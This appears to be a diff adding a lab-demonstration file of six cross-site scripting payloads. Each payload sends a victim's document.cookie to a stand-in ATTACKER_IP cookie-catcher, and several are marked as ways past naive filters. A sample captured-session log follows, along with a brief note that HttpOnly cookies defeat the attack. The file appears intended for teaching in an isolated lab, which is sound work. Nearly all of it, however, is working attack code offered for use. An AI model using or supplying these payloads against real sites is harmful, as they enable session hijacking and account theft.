@@ -1,0 +1,39 @@
+==========================================================
+ XSS PAYLOADS FOR LAB DEMONSTRATION
+ Replace ATTACKER_IP with your CookieCatcher host (e.g. 192.168.1.10)
+ USE ONLY in an isolated, authorized lab environment.
+==========================================================
+
+# 1. Basic script tag (often blocked by naive filters)
+<script>document.location='http://ATTACKER_IP:8080/?c='+document.cookie</script>
+
+# 2. Image onerror (bypasses many <script> filters) -- RECOMMENDED FOR DEMO
+<img src=x onerror="this.src='http://ATTACKER_IP:8080/?c='+document.cookie">
+
+# 3. SVG onload
+<svg onload="fetch('http://ATTACKER_IP:8080/?c='+document.cookie)">
+
+# 4. Input autofocus
+<input autofocus onfocus="location='http://ATTACKER_IP:8080/?c='+document.cookie">
+
+# 5. Base64 encode the cookie (cleaner transport)
+<img src=x onerror="fetch('http://ATTACKER_IP:8080/?c='+btoa(document.cookie))">
+
+# 6. Video onerror
+<video src=x onerror="fetch('http://ATTACKER_IP:8080/?c='+document.cookie)">
+
+----------------------------------------------------------
+EXPECTED RESULT
+----------------------------------------------------------
+When the victim views the page containing one of these payloads,
+their browser sends document.cookie to the CookieCatcher server.
+The attacker then sees an entry like:
+
+  === COOKIE CAPTURED ===
+  TIME        : 2024-01-15 14:45:03
+  SOURCE_IP   : 192.168.1.20
+  USER_AGENT  : Mozilla/5.0 ... Chrome/120.0
+  COOKIE      : PHPSESSID=abc123xyz789; user_id=12345
+
+NOTE: If the cookie has the HttpOnly flag, document.cookie returns
+an empty string and NOTHING is captured -> see ../defenses/01.
